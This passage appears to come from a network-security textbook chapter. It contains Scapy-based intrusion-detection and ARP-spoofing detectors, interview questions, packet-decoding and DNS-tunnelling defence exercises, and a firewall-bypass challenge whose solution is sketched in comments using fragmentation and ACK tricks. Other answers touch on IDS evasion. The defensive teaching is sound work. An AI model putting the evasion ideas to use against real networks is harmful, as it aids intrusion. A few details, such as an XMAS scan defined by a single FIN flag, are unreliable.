class NetworkMonitor:
    def __init__(self):
        self.stats = {
            'total_packets': 0,
            'tcp_packets': 0,
            'udp_packets': 0,
            'icmp_packets': 0,
            'suspicious_packets': 0
        }
        
        self.alerts = []
        self.ip_tracker = defaultdict(lambda: {
            'packets': 0,
            'bytes': 0,
            'ports_contacted': set(),
            'first_seen': time.time(),
            'last_seen': time.time()
        })
    
    def analyze_packet(self, packet):
        """
        Analyze packet for security issues
        """
        self.stats['total_packets'] += 1
        
        if IP in packet:
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            
            # Update IP tracking
            self.ip_tracker[src_ip]['packets'] += 1
            self.ip_tracker[src_ip]['bytes'] += len(packet)
            self.ip_tracker[src_ip]['last_seen'] = time.time()
            
            # TCP analysis
            if TCP in packet:
                self.stats['tcp_packets'] += 1
                self.analyze_tcp(packet)
            
            # UDP analysis
            elif UDP in packet:
                self.stats['udp_packets'] += 1
                self.analyze_udp(packet)
            
            # ICMP analysis
            elif ICMP in packet:
                self.stats['icmp_packets'] += 1
                self.analyze_icmp(packet)
    
    def analyze_tcp(self, packet):
        """
        Analyze TCP packet for suspicious activity
        """
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        dst_port = packet[TCP].dport
        flags = packet[TCP].flags
        
        # Track ports
        self.ip_tracker[src_ip]['ports_contacted'].add(dst_port)
        
        # Check for port scanning
        if len(self.ip_tracker[src_ip]['ports_contacted']) > 20:
            self.create_alert("PORT_SCAN", src_ip, 
                            f"Contacted {len(self.ip_tracker[src_ip]['ports_contacted'])} ports")
        
        # Check for suspicious flags
        if flags == "F" or flags == "FPU":  # XMAS scan
            self.create_alert("XMAS_SCAN", src_ip, f"Target: {dst_ip}:{dst_port}")
        
        elif flags == 0:  # NULL scan
            self.create_alert("NULL_SCAN", src_ip, f"Target: {dst_ip}:{dst_port}")
        
        elif flags == "SF":  # SYN+FIN (invalid)
            self.create_alert("INVALID_FLAGS", src_ip, f"SYN+FIN to {dst_ip}:{dst_port}")
        
        # Check for SYN flood
        if flags == "S":
            # If more than 100 SYNs per second from same IP
            duration = time.time() - self.ip_tracker[src_ip]['first_seen']
            if duration > 0:
                rate = self.ip_tracker[src_ip]['packets'] / duration
                if rate > 100:
                    self.create_alert("SYN_FLOOD", src_ip, f"Rate: {rate:.2f} pkts/sec")
    
    def analyze_udp(self, packet):
        """
        Analyze UDP packet
        """
        src_ip = packet[IP].src
        dst_port = packet[UDP].dport
        
        # Check for DNS
        if DNS in packet and packet[DNS].qr == 0:
            query = packet[DNS].qd.qname.decode()
            
            # Long DNS query (possible tunneling)
            if len(query) > 50:
                self.create_alert("SUSPICIOUS_DNS", src_ip, f"Long query: {query[:50]}...")
    
    def analyze_icmp(self, packet):
        """
        Analyze ICMP packet
        """
        src_ip = packet[IP].src
        
        # Track ICMP rate
        duration = time.time() - self.ip_tracker[src_ip]['first_seen']
        if duration > 0:
            rate = self.ip_tracker[src_ip]['packets'] / duration
            
            # ICMP flood
            if rate > 50:
                self.create_alert("ICMP_FLOOD", src_ip, f"Rate: {rate:.2f} pkts/sec")
        
        # Large ICMP payload (possible tunneling)
        if Raw in packet and len(packet[Raw].load) > 100:
            self.create_alert("LARGE_ICMP", src_ip, 
                            f"Payload size: {len(packet[Raw].load)} bytes")
    
    def create_alert(self, alert_type, source, details):
        """
        Create security alert
        """
        alert = {
            'timestamp': datetime.now().isoformat(),
            'type': alert_type,
            'source': source,
            'details': details
        }
        
        self.alerts.append(alert)
        self.stats['suspicious_packets'] += 1
        
        # Print alert
        print(f"\n[!] ALERT: {alert_type}")
        print(f"    Time: {alert['timestamp']}")
        print(f"    Source: {source}")
        print(f"    Details: {details}")
    
    def print_summary(self):
        """
        Print monitoring summary
        """
        print(f"\n{'='*60}")
        print("NETWORK MONITORING SUMMARY")
        print(f"{'='*60}")
        print(f"Total Packets:       {self.stats['total_packets']}")
        print(f"TCP Packets:         {self.stats['tcp_packets']}")
        print(f"UDP Packets:         {self.stats['udp_packets']}")
        print(f"ICMP Packets:        {self.stats['icmp_packets']}")
        print(f"Suspicious Packets:  {self.stats['suspicious_packets']}")
        print(f"Total Alerts:        {len(self.alerts)}")
        print(f"Unique IPs Seen:     {len(self.ip_tracker)}")
        
        # Top talkers
        print(f"\nTop 10 Talkers:")
        sorted_ips = sorted(self.ip_tracker.items(), 
                          key=lambda x: x[1]['packets'], reverse=True)[:10]
        
        for ip, data in sorted_ips:
            print(f"  {ip}: {data['packets']} packets, {data['bytes']} bytes")
        
        # Alert summary
        if self.alerts:
            print(f"\nAlert Summary:")
            alert_types = defaultdict(int)
            for alert in self.alerts:
                alert_types[alert['type']] += 1
            
            for alert_type, count in alert_types.items():
                print(f"  {alert_type}: {count}")

def monitor_network(interface="eth0", duration=300):
    """
    Monitor network for specified duration
    """
    print(f"""
╔══════════════════════════════════════════════════════════╗
║        NETWORK SECURITY MONITORING                       ║
║        Interface: {interface:<39} ║
║        Duration: {duration} seconds{' '*29} ║
╚══════════════════════════════════════════════════════════╝

[*] Starting monitoring...
[*] Press Ctrl+C to stop early
    """)
    
    monitor = NetworkMonitor()
    
    try:
        sniff(iface=interface, prn=monitor.analyze_packet, 
              timeout=duration, store=0)
    except KeyboardInterrupt:
        print("\n[*] Stopped by user")
    
    # Print summary
    monitor.print_summary()
    
    # Save alerts to file
    if monitor.alerts:
        filename = f"alerts_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(monitor.alerts, f, indent=2)
        print(f"\n[*] Alerts saved to: {filename}")

# Example usage
if __name__ == "__main__":
    interface = input("[?] Interface to monitor (default: eth0): ") or "eth0"
    duration = int(input("[?] Duration in seconds (default: 300): ") or "300")
    
    monitor_network(interface, duration)
```

---

## 14. Real-World Case Studies

### 14.1 Case Study: Detecting and Preventing ARP Spoofing

**Scenario**: Corporate network with 500 hosts experiencing intermittent connectivity issues.

**Investigation**:
1. Monitor ARP traffic for inconsistencies
2. Detect duplicate IP/MAC mappings
3. Identify the attacker
4. Implement prevention

**Solution Implementation:**

```python
#!/usr/bin/env python3
"""
ARP Spoofing Detection and Prevention
Real-world implementation
"""

from scapy.all import *
from collections import defaultdict
import time

class ARPMonitor:
    def __init__(self):
        self.arp_table = {}  # {ip: (mac, timestamp)}
        self.suspicious_activity = defaultdict(list)
        self.trusted_gateways = {}  # {ip: mac}
    
    def load_trusted_devices(self, filename="trusted_devices.txt"):
        """
        Load known-good MAC addresses for critical devices
        """
        try:
            with open(filename, 'r') as f:
                for line in f:
                    ip, mac = line.strip().split(',')
                    self.trusted_gateways[ip] = mac.upper()
            print(f"[+] Loaded {len(self.trusted_gateways)} trusted devices")
        except FileNotFoundError:
            print("[-] No trusted devices file found")
    
    def process_arp(self, packet):
        """
        Process ARP packet and detect spoofing
        """
        if ARP in packet:
            if packet[ARP].op == 2:  # ARP reply
                ip = packet[ARP].psrc
                mac = packet[ARP].hwsrc.upper()
                
                # Check against trusted devices
                if ip in self.trusted_gateways:
                    if mac != self.trusted_gateways[ip]:
                        self.create_alert("GATEWAY_SPOOF", ip, mac, 
                                        self.trusted_gateways[ip])
                        return
                
                # Check for IP/MAC changes
                if ip in self.arp_table:
                    old_mac, old_time = self.arp_table[ip]
                    
                    if mac != old_mac:
                        # MAC changed for this IP
                        time_diff = time.time() - old_time
                        
                        # If changed within 60 seconds, likely spoofing
                        if time_diff < 60:
                            self.create_alert("ARP_SPOOF", ip, mac, old_mac)
                        else:
                            # Might be legitimate (device replaced/rebooted)
                            print(f"[*] MAC changed for {ip}: {old_mac} -> {mac}")
                            print(f"    Time since last seen: {time_diff:.0f} seconds")
                
                # Update table
                self.arp_table[ip] = (mac, time.time())
    
    def create_alert(self, alert_type, ip, new_mac, old_mac):
        """
        Create and log alert
        """
        alert = {
            'timestamp': time.time(),
            'type': alert_type,
            'ip': ip,
            'old_mac': old_mac,
            'new_mac': new_mac
        }
        
        self.suspicious_activity[ip].append(alert)
        
        print(f"\n[!] ALERT: {alert_type}")
        print(f"    IP Address: {ip}")
        print(f"    Expected MAC: {old_mac}")
        print(f"    Received MAC: {new_mac}")
        print(f"    Time: {time.ctime()}")
        
        # Take action
        if alert_type == "GATEWAY_SPOOF":
            print(f"\n[!] CRITICAL: Gateway spoofing detected!")
            print(f"[*] Recommended actions:")
            print(f"    1. Isolate suspicious MAC: {new_mac}")
            print(f"    2. Enable Dynamic ARP Inspection on switches")
            print(f"    3. Investigate host with MAC: {new_mac}")
            
            # Auto-remediation (optional)
            # self.block_mac(new_mac)
    
    def print_arp_table(self):
        """
        Print current ARP table
        """
        print(f"\n{'='*60}")
        print("CURRENT ARP TABLE")
        print(f"{'='*60}")
        print(f"{'IP Address':<20} {'MAC Address':<20} {'Last Seen'}")
        print(f"{'-'*60}")
        
        for ip, (mac, timestamp) in sorted(self.arp_table.items()):
            age = time.time() - timestamp
            print(f"{ip:<20} {mac:<20} {age:.0f}s ago")
    
    def generate_report(self):
        """
        Generate security report
        """
        print(f"\n{'='*60}")
        print("ARP SPOOFING DETECTION REPORT")
        print(f"{'='*60}")
        
        total_alerts = sum(len(alerts) for alerts in self.suspicious_activity.values())
        
        print(f"Total Alerts: {total_alerts}")
        print(f"Affected IPs: {len(self.suspicious_activity)}")
        
        if self.suspicious_activity:
            print(f"\nDetailed Alerts:")
            for ip, alerts in self.suspicious_activity.items():
                print(f"\n  IP: {ip}")
                for alert in alerts:
                    print(f"    Time: {time.ctime(alert['timestamp'])}")
                    print(f"    Type: {alert['type']}")
                    print(f"    Old MAC: {alert['old_mac']}")
                    print(f"    New MAC: {alert['new_mac']}")

def monitor_arp(interface="eth0", duration=3600):
    """
    Monitor ARP traffic
    """
    print(f"""
╔══════════════════════════════════════════════════════════╗
║        ARP SPOOFING DETECTION SYSTEM                     ║
╚══════════════════════════════════════════════════════════╝

[*] Monitoring interface: {interface}
[*] Duration: {duration} seconds
[*] Press Ctrl+C to stop
    """)
    
    monitor = ARPMonitor()
    monitor.load_trusted_devices()
    
    try:
        sniff(iface=interface, filter="arp", prn=monitor.process_arp, 
              timeout=duration, store=0)
    except KeyboardInterrupt:
        print("\n[*] Stopped by user")
    
    monitor.print_arp_table()
    monitor.generate_report()

# Example usage
if __name__ == "__main__":
    interface = input("[?] Interface to monitor (default: eth0): ") or "eth0"
    monitor_arp(interface)
```

**Prevention Measures:**

1. **Enable Dynamic ARP Inspection (DAI) on switches**
2. **Static ARP entries for critical devices**
3. **Network segmentation**
4. **802.1X authentication**

---

## 15. Critical Analysis & Checkpoints

### 15.1 Critical Thinking

**Q: Why does the "End-to-End Principle" of the internet make security hard?**
*Answer*: The network was designed to be a "dumb pipe" that moves data efficiently, pushing intelligence to the edges (hosts). This means the network layer doesn't inherently understand "malware" vs "legitimate data"—it just delivers packets. Security devices try to add intelligence back into the middle, which is expensive and complex.

**Q: How does encapsulation enable both functionality and vulnerability?**
*Answer*: Encapsulation allows layering and abstraction, making protocols modular and extensible. However, it also creates "trust boundaries" where each layer trusts the one below it. Attackers exploit this by:
- Tunneling malicious traffic inside legitimate protocols
- Manipulating headers at one layer to affect another
- Exploiting inconsistencies in how different systems parse layered protocols

**Q: Why can't we just "fix" the TCP/IP stack to eliminate all these vulnerabilities?**
*Answer*: Several reasons:
1. **Backward compatibility**: Billions of devices rely on current behavior
2. **Performance trade-offs**: Security checks add overhead
3. **Fundamental design**: Built for reliability, not security
4. **Economic factors**: Replacing infrastructure is costly
5. **Evolution vs Revolution**: Easier to patch than redesign

### 15.2 Interview Questions

1.  **Q**: If I change the destination IP address of a packet on the fly, what else must I change?
    -   **A**: You must recalculate the **IP Checksum**. If it's a TCP packet, you must also recalculate the **TCP Checksum** (because of the pseudo-header). If you don't, the receiving stack will drop it as corrupted.

2.  **Q**: Can you have a TCP connection without IP?
    -   **A**: No (in the modern internet). TCP relies on IP for addressing. However, you *could* technically run TCP over a different network layer protocol (like CLNP), but that's academic history.

3.  **Q**: What is the security implication of IPv6 Extension Headers?
    -   **A**: They allow chaining headers indefinitely. Security tools that have a fixed buffer for header inspection (e.g., "Check first 100 bytes") can be bypassed by pushing the malicious payload deep behind a long chain of extension headers (Extension Header chaining attacks).

4.  **Q**: Explain the difference between a SYN flood and a SYN-ACK flood.**
    -   **A**: 
        - **SYN Flood**: Attacker sends many SYN packets with spoofed source IPs to exhaust server's connection queue
        - **SYN-ACK Flood**: Attacker sends many SYN-ACK packets to random victims, making them send RST responses (used for amplification)

5.  **Q**: How does TTL help prevent routing loops, and how can attackers abuse it?**
    -   **A**: 
        - **Prevention**: TTL decrements at each hop; packet dropped when TTL=0, preventing infinite loops
        - **Abuse**: Attackers use low TTL values to map network topology (traceroute) or evade detection by ensuring packets die before reaching monitoring points

6.  **Q**: What's the difference between fragmentation at IP layer vs. segmentation at TCP layer?**
    -   **A**:
        - **IP Fragmentation**: Layer 3, breaks packet into smaller pieces due to MTU limits, reassembled at final destination
        - **TCP Segmentation**: Layer 4, breaks data stream into segments before IP layer, each segment becomes separate IP packet
        - **Security**: IP fragmentation more prone to evasion attacks since fragments analyzed independently

7.  **Q**: Why do some protocols use both a length field and a terminator (e.g., \\r\\n)?**
    -   **A**: Defense in depth and compatibility:
        - **Length field**: Efficient parsing, prevents buffer overflows
        - **Terminator**: Backward compatibility, human readability, error detection
        - **Both**: Parsers can validate consistency, detect tampering

8.  **Q**: How can an attacker determine the OS of a target without sending obvious scanning traffic?**
    -   **A**: Passive OS fingerprinting by analyzing:
        - TTL values (Linux=64, Windows=128, Cisco=255)
        - TCP window sizes
        - TCP options order and values
        - IP ID sequences
        - ICMP responses
        - HTTP headers (User-Agent, Server)

### 15.3 Practice Exercises

**Exercise 1: Packet Analysis**
Given this hex dump, decode the packet:
```
45 00 00 3c 1c 46 40 00 40 06 b1 e6 c0 a8 01 64
c0 a8 01 01 04 d2 00 50 00 00 00 00 00 00 00 00
a0 02 72 10 e3 2a 00 00 02 04 05 b4 04 02 08 0a
00 62 31 5f 00 00 00 00 01 03 03 07
```

**Solution:**
```
IP Header:
  45       = Version 4, IHL 5 (20 bytes)
  00       = TOS
  00 3c    = Total length: 60 bytes
  1c 46    = ID: 7238
  40 00    = Flags: DF, Offset: 0
  40       = TTL: 64
  06       = Protocol: TCP
  b1 e6    = Checksum
  c0a80164 = Src IP: 192.168.1.100
  c0a80101 = Dst IP: 192.168.1.1

TCP Header:
  04d2     = Src Port: 1234
  0050     = Dst Port: 80 (HTTP)
  00000000 = Seq: 0
  00000000 = Ack: 0
  a0       = Data Offset: 10 (40 bytes)
  02       = Flags: SYN
  7210     = Window: 29200
  e32a     = Checksum
  0000     = Urgent pointer

TCP Options:
  02 04 05 b4    = MSS: 1460
  04 02          = SACK permitted
  08 0a ...      = Timestamps
  01 03 03 07    = Window Scale: 7
```

**Exercise 2: Design a Defense**
Your network is experiencing DNS tunneling. Design a multi-layer defense strategy.

**Solution:**
```
Layer 1: Detection
  - Monitor DNS query length (>50 chars = suspicious)
  - Track DNS query entropy (high randomness = encoded data)
  - Monitor DNS query volume per host (>100/min = suspicious)
  - Analyze subdomain patterns

Layer 2: Prevention
  - Whitelist DNS servers (only allow queries to corporate DNS)
  - Block direct external DNS (force through internal resolvers)
  - Implement DNS sinkholing for known bad domains

Layer 3: Logging & Analysis
  - Full DNS query logging
  - SIEM correlation with other events
  - Baseline normal DNS behavior per host

Layer 4: Response
  - Automated blocking of high-entropy queries
  - Quarantine affected hosts
  - Investigate data exfiltration

Implementation:

```python
# DNS tunneling detector (simplified)
def detect_dns_tunneling(query):
    alerts = []
    
    subdomain = query.split('.')[0]
    
    # Length check
    if len(subdomain) > 50:
        alerts.append(f"Long subdomain: {len(subdomain)} chars")
    
    # Entropy check
    entropy = calculate_entropy(subdomain)
    if entropy > 4.0:  # High entropy
        alerts.append(f"High entropy: {entropy:.2f}")
    
    # Character diversity
    diversity = len(set(subdomain)) / len(subdomain)
    if diversity > 0.7:
        alerts.append(f"High diversity: {diversity:.2f}")
    
    return alerts
```
```

### 15.4 Advanced Challenge

**Challenge: Create a packet that bypasses a firewall that:**
1. Blocks SYN packets to port 80
2. Allows established connections
3. Performs stateful inspection

**Hint**: Think about fragmentation, flags, and sequence numbers.

**Solution Concept:**
```python
# Fragment the SYN packet so the TCP header
# is split across fragments
# Firewall sees first fragment (no TCP header)
# Firewall sees second fragment (TCP header but no IP context)
# Target reassembles and processes SYN

# Or: Send ACK packet with valid-looking sequence number
# Some stateless filters might allow it thinking it's established
```

---

## Summary

This chapter covered:

1. **OSI and TCP/IP Models**: Theoretical vs practical implementations
2. **Encapsulation**: How data is wrapped in layers and the security implications
3. **Packet Anatomy**: Bit-level understanding of Ethernet, IP, TCP, UDP headers
4. **Attack Techniques**: Fragmentation, spoofing, tunneling, layer-specific attacks
5. **Defense Strategies**: IDS/IPS, Zero Trust, micro-segmentation, monitoring
6. **Practical Labs**: Hands-on packet crafting, analysis, and exploitation
7. **Advanced Topics**: State machines, raw sockets, protocol analysis
8. **Real-World Cases**: ARP spoofing detection and prevention

### Key Takeaways

- **Layers are abstractions**: Understanding where they break reveals vulnerabilities
- **Trust is delegated**: Each layer trusts the one below it - exploit this
- **Defense in depth**: No single layer provides complete security
- **Visibility is critical**: You can't defend what you can't see
- **Practical skills matter**: Theory must be backed by hands-on experience

### Next Steps

1. Practice packet crafting with Scapy
2. Set up a lab environment for safe testing
3. Analyze real network traffic with Wireshark
4. Study protocol RFCs for deep understanding
5. Build your own IDS signatures
6. Participate in CTF challenges focused on networking

---

*End of Chapter: Networking Architecture & Models*

